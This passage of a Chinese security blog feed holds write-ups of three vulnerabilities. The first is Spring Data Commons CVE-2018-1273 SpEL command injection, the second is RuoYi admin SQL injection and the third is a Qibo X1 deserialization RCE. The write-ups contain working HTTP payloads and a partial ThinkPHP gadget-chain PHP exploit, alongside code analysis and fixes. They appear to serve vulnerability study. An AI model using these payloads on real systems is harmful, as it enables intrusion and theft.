class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">155</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">192.168.111.133:8080</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.111.133:8080</span>/users?page=&amp;size=<span class="hljs-number">5</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">username</span>%<span class="hljs-number">5</span>B%<span class="hljs-number">23</span>this.getClass%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>.forName%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>java.lang.Runtime%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>.getRuntime%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>.exec%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>touch+%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ftest%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">5</span>D=&amp;password=&amp;repeatedPassword=<br></code></pre></td></tr></table></figure><p>发送payload</p><p><a href="https://imgtu.com/i/hddtWd"><img src="https://z3.ax1x.com/2021/08/31/hddtWd.png" alt="hddtWd.png"></a></p><p>成功创建文件</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">docker-compose <span class="hljs-keyword">exec</span> <span class="hljs-keyword">spring</span> bash<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hdd8oD"><img src="https://z3.ax1x.com/2021/08/31/hdd8oD.png" alt="hdd8oD.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>1.</p><p>web/example/src/main/java/example/users/web/UserController</p><p>register()函数对应上面的注册功能，使用POST方式获取用户表单参数数据</p><p><a href="https://imgtu.com/i/hdddyt"><img src="https://z3.ax1x.com/2021/08/31/hdddyt.png" alt="hdddyt.png"></a></p><p>2.</p><p>register函数中包含表单提交操作，Form表单的提交操作会调用到<code>ProxyingHandlerMethodArgumentResolver</code>，而<code>ProxyingHandlerMethodArgumentResolver</code>中实例化了<code>MapDataBinder</code>，并调用了<code>bind</code>方法。<code>request.getParameterMap()</code>就是传入的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyingHandlerMethodArgumentResolver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ModelAttributeMethodProcessor</span></span><br><span class="hljs-class">    <span class="hljs-keyword">implements</span> <span class="hljs-title">BeanFactoryAware</span>, <span class="hljs-title">BeanClassLoaderAware</span> </span>&#123;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">createAttribute</span><span class="hljs-params">(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory,NativeWebRequest request)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>      MapDataBinder binder = <span class="hljs-keyword">new</span> MapDataBinder(parameter.getParameterType(),conversionService.getObject());<br>      binder.bind(<span class="hljs-keyword">new</span> MutablePropertyValues(request.getParameterMap()));<br>      <span class="hljs-keyword">return</span> proxyFactory.createProjection(parameter.getParameterType(), binder.getTarget());<br><br>   &#125;<br></code></pre></td></tr></table></figure><p>3.</p><p>bind方法之后的调用链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">bind</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">doBind</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">super</span>.doBind-&gt;</span><span class="hljs-function"><span class="hljs-title">applyPropertyValues</span>-&gt;</span>this.getPropertyAccessor().setPropertyValues<br></code></pre></td></tr></table></figure><p>4.</p><p><code>org.springframework.data.web.MapDataBinder</code></p><ol><li>调用isWritableProperty()检验传入的propertyName参数</li><li>创建StandardEvaluationContext，调用PARSER.parseExpression()，参数为传入的proertyName</li><li>调用expression.setValue()进行SpEL表达式解析</li></ol><p><a href="https://imgtu.com/i/hddwOP"><img src="https://z3.ax1x.com/2021/08/31/hddwOP.png" alt="hddwOP.png"></a></p><p>实际调用getPropertyPath</p><p><a href="https://imgtu.com/i/hddYJH"><img src="https://z3.ax1x.com/2021/08/31/hddYJH.png" alt="hddYJH.png"></a></p><p>正则匹配传入参数<code>[]</code>中的内容并替换为空，然后和this.type一起作为参数进入PropertyPath.form</p><p><a href="https://imgtu.com/i/hddJFe"><img src="https://z3.ax1x.com/2021/08/31/hddJFe.png" alt="hddJFe.png"></a></p><p>判断替换过后的内容是否是type中的属性，type就是在Controller处用到的用于接收参数的类。</p><p><a href="https://imgtu.com/i/hddUSA"><img src="https://z3.ax1x.com/2021/08/31/hddUSA.png" alt="hddUSA.png"></a></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>将StandardEvaluationContext替换为SimpleEvaluationContext，因为SimpleEvaluationContext权限更小，在解析SpEL表达式时无法使用Runtime.class执行任何系统命令</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://threedr3am.github.io/2019/03/24/Spring-Data-Commons%20CVE-2018-1273%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://threedr3am.github.io/2019/03/24/Spring-Data-Commons%20CVE-2018-1273%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c">https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c</a></p><p><a href="https://xz.aliyun.com/t/2269">https://xz.aliyun.com/t/2269</a></p><p><a href="https://www.mi1k7ea.com/2020/02/03/%E6%B5%85%E6%9E%90Spring-Data-Commons%E4%B9%8BCVE-2018-1273/">https://www.mi1k7ea.com/2020/02/03/%E6%B5%85%E6%9E%90Spring-Data-Commons%E4%B9%8BCVE-2018-1273/</a></p><p><a href="https://vulhub.org/#/environments/spring/CVE-2018-1273/">https://vulhub.org/#/environments/spring/CVE-2018-1273/</a></p><p><a href="https://xz.aliyun.com/t/2269">https://xz.aliyun.com/t/2269</a></p><p><a href="https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/">https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/</a></p><p><a href="https://www.cnblogs.com/Found404/p/14202543.html">https://www.cnblogs.com/Found404/p/14202543.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>若依cms后台注入分析</title>
    <link href="/2021/08/30/%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <url>/2021/08/30/%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h1><p>影响版本：RuoYi &lt;= v4.6.1</p><p>修复措施和其他情况可参考官方文档</p><p><a href="https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E">https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E</a></p><p><a href="https://imgtu.com/i/hYMqSA"><img src="https://z3.ax1x.com/2021/08/30/hYMqSA.png" alt="hYMqSA.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">pageSize=<span class="hljs-variable">&amp;pageNum</span>=<span class="hljs-variable">&amp;orderByColumn</span>=<span class="hljs-variable">&amp;isAsc</span>=<span class="hljs-variable">&amp;roleName</span>=<span class="hljs-variable">&amp;roleKey</span>=<span class="hljs-variable">&amp;status</span>=<span class="hljs-variable">&amp;params</span>[beginTime]=<span class="hljs-variable">&amp;params</span>[endTime]=<span class="hljs-variable">&amp;params</span>[dataScope]=<span class="hljs-meta">and</span> extractvalue(1,concat(0x7e,(<span class="hljs-meta">select</span> database()),0x7e))<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hYMIoD"><img src="https://z3.ax1x.com/2021/08/30/hYMIoD.png" alt="hYMIoD.png"></a></p><p>POST数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /system/role/list HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">213</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://localhost/<br><span class="hljs-attribute">Cookie</span>: cookieconsent_status=dismiss; Hm_lvt_c<span class="hljs-number">12</span>f<span class="hljs-number">88</span>b<span class="hljs-number">5</span>c<span class="hljs-number">1</span>cd<span class="hljs-number">041</span>a<span class="hljs-number">732</span>dea<span class="hljs-number">597</span>a<span class="hljs-number">5</span>ec<span class="hljs-number">94</span>c=<span class="hljs-number">1609381035</span>; bdshare_firstime=<span class="hljs-number">1609381035017</span>; Hm_lvt_d<span class="hljs-number">6</span>ceebbfea<span class="hljs-number">56</span>af<span class="hljs-number">954</span>e<span class="hljs-number">58</span>ccea<span class="hljs-number">336</span>c<span class="hljs-number">10</span>d<span class="hljs-number">8</span>=<span class="hljs-number">1612666019</span>,<span class="hljs-number">1614563564</span>; UM_distinctid=<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>c<span class="hljs-number">31</span>-<span class="hljs-number">0</span>aacb<span class="hljs-number">8</span>a<span class="hljs-number">3</span>b<span class="hljs-number">601</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4</span>c<span class="hljs-number">3</span>f<span class="hljs-number">227</span>c-<span class="hljs-number">1</span>fa<span class="hljs-number">400</span>-<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>d<span class="hljs-number">5</span>d<span class="hljs-number">8</span>; CNZZDATA<span class="hljs-number">1277972876</span>=<span class="hljs-number">1856010917</span>-<span class="hljs-number">1614837798</span>-%<span class="hljs-number">7</span>C<span class="hljs-number">1614837798</span>; Hm_lvt_b<span class="hljs-number">60316</span>de<span class="hljs-number">6009</span>d<span class="hljs-number">5654</span>de<span class="hljs-number">7312</span>f<span class="hljs-number">772162</span>be=<span class="hljs-number">1621413156</span>,<span class="hljs-number">1621496582</span>; KCFINDER_showname=<span class="hljs-literal">on</span>; KCFINDER_showsize=<span class="hljs-literal">off</span>; KCFINDER_showtime=<span class="hljs-literal">off</span>; KCFINDER_order=name; KCFINDER_orderDesc=<span class="hljs-literal">off</span>; KCFINDER_view=thumbs; KCFINDER_displaySettings=<span class="hljs-literal">off</span>; JSESSIONID=c<span class="hljs-number">8071</span>c<span class="hljs-number">07</span>-b<span class="hljs-number">81</span>a-<span class="hljs-number">4</span>b<span class="hljs-number">5</span>f-<span class="hljs-number">87</span>cd-cc<span class="hljs-number">069</span>dd<span class="hljs-number">11457</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-Site: cross-site<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><br><span class="hljs-attribute">pageSize</span>=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;status=&amp;params%<span class="hljs-number">5</span>BbeginTime%<span class="hljs-number">5</span>D=&amp;params%<span class="hljs-number">5</span>BendTime%<span class="hljs-number">5</span>D=&amp;params%<span class="hljs-number">5</span>BdataScope%<span class="hljs-number">5</span>D=and+extractvalue%<span class="hljs-number">281</span>%<span class="hljs-number">2</span>Cconcat%<span class="hljs-number">280</span>x<span class="hljs-number">7</span>e%<span class="hljs-number">2</span>C%<span class="hljs-number">28</span>select+database%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>C<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e%<span class="hljs-number">29</span>%<span class="hljs-number">29</span><br></code></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>1.</p><p>/ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysRoleController</p><p>来到/system/role/list对应的方法</p><p><a href="https://imgtu.com/i/hYM5dO"><img src="https://z3.ax1x.com/2021/08/30/hYM5dO.png" alt="hYM5dO.png"></a></p><p>传入的参数为SysRole类型</p><p><a href="https://imgtu.com/i/hYM4eK"><img src="https://z3.ax1x.com/2021/08/30/hYM4eK.png" alt="hYM4eK.png"></a></p><p>/ruoyi-common/src/main/java/com/ruoyi/common/core/controller/BaseController</p><p>startPage方法，调用TableSupport.buildPageRequest()，条件不满足不进入if</p><p><a href="https://imgtu.com/i/hYMfL6"><img src="https://z3.ax1x.com/2021/08/30/hYMfL6.png" alt="hYMfL6.png"></a></p><p>/ruoyi-common/src/main/java/com/ruoyi/common/core/buildPageRequest</p><p>功能为获取输入的POST参数，如分页数等，没有也不影响注入。</p><p><a href="https://imgtu.com/i/hYMWsx"><img src="https://z3.ax1x.com/2021/08/30/hYMWsx.png" alt="hYMWsx.png"></a></p><p>2.</p><p>/ruoyi-common/src/main/java/com/ruoyi/common/core/domain/entity/SysRole.java</p><p>来看一下SysRole这个类，<code>dataScope</code>属性就是注入的payload</p><p><a href="https://imgtu.com/i/hYMTFe"><img src="https://z3.ax1x.com/2021/08/30/hYMTFe.png" alt="hYMTFe.png"></a></p><p>3.</p><p>/ruoyi-system/src/main/java/com/ruoyi/system/mapper/SysRoleMapper.java</p><p>进入selectRoleList方法</p><p><a href="https://imgtu.com/i/hYM7JH"><img src="https://z3.ax1x.com/2021/08/30/hYM7JH.png" alt="hYM7JH.png"></a></p><p>4.</p><p>/ruoyi-system/src/main/resources/mapper/system/SysRoleMappper.xml</p><p>这里使用了MyBatis框架，补充一下有关信息</p><blockquote><p>Mybatis框架思想是把SQL语句写入配置文件，避免SQL语句在Java程序中大量出现，方便后续配置。</p><p>Mybatis中使用parameterType向SQL语句传参，在SQL中引用传参可以使用<code>$&#123;Parameter&#125;</code>和<code>#&#123;Parameter&#125;</code>两种方式。<code>#&#123;Parameter&#125;</code>会使用?占位进行预编译，不存在SQL注入，而${Parameter}采用拼接的方式构造SQL，在过滤不严的情况下存在SQL注入</p></blockquote><p>可以看到<code>$&#123;params.dataScope&#125;</code>被直接拼接入sql语句，造成SQL注入</p><p><a href="https://imgtu.com/i/hYMHWd"><img src="https://z3.ax1x.com/2021/08/30/hYMHWd.png" alt="hYMHWd.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://forum.butian.net/share/485">https://forum.butian.net/share/485</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计：齐博X1反序列化漏洞</title>
    <link href="/2021/08/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E9%BD%90%E5%8D%9AX1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/08/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E9%BD%90%E5%8D%9AX1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>/application/member/controller/Msg.php</p><p>listqun方法直接将可控参数传入unserialize，造成反序列化漏洞，程序基于thinkphp5.0.18开发，配合thinkphp反序列化利用链即可实现RCE</p><p><a href="https://imgtu.com/i/hGoCrj"><img src="https://z3.ax1x.com/2021/08/29/hGoCrj.png" alt="hGoCrj.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h2><p>下载源码：<a href="http://www.php168.com/x1.zip">www.php168.com/x1.zip</a></p><p>在本地搭建环境</p><p>先在前台注册一个用户</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/index.php/i</span>ndex<span class="hljs-regexp">/reg/i</span>ndex.html<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hGoPqs"><img src="https://z3.ax1x.com/2021/08/29/hGoPqs.png" alt="hGoPqs.png"></a></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Windows</span> &#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">files</span> = [];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$files</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;files = [<span class="hljs-variable">$files</span>]; <span class="hljs-comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span> &#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$output</span>, <span class="hljs-variable">$modelRelation</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;parent = <span class="hljs-variable">$output</span>;  <span class="hljs-comment">//$this-&gt;parent=&gt; think\console\Output;</span><br>            <span class="hljs-keyword">$this</span>-&gt;append = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;xxx&quot;</span>=&gt;<span class="hljs-string">&quot;getError&quot;</span>);     <span class="hljs-comment">//调用getError 返回this-&gt;error</span><br>            <span class="hljs-keyword">$this</span>-&gt;error = <span class="hljs-variable">$modelRelation</span>;               <span class="hljs-comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$output</span>, <span class="hljs-variable">$modelRelation</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-built_in">parent</span>::__construct(<span class="hljs-variable">$output</span>, <span class="hljs-variable">$modelRelation</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">HasOne</span> <span class="hljs-title">extends</span> <span class="hljs-title">OneToOne</span> &#123;<br><br>    &#125;<br>&#125;<br><span class="hljs-title">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span> &#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">OneToOne</span><br>    &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">selfRelation</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$query</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-variable">$query</span>;    <span class="hljs-comment">//$query指向Query</span><br>            <span class="hljs-keyword">$this</span>-&gt;bindAttr = [<span class="hljs-string">&#x27;xxx&#x27;</span>];<span class="hljs-comment">// $value值，作为call函数引用的第二变量</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Query</span> &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">model</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$model</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;model = <span class="hljs-variable">$model</span>; <span class="hljs-comment">//$this-&gt;model=&gt; think\console\Output;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Output</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">handle</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$handle</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;handle =<span class="hljs-variable">$handle</span>; <span class="hljs-comment">//$handle-&gt;think\session\driver\Memcached</span><br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Memcached</span><br>    &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">handler</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$handle</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;handler = <span class="hljs-variable">$handle</span>; <span class="hljs-comment">//$handle-&gt;think\cache\driver\File</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">File</span><br>    &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">options</span>=<span class="hljs-title">null</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;options=[<br>                <span class="hljs-string">&#x27;expire&#x27;</span> =&gt; <span 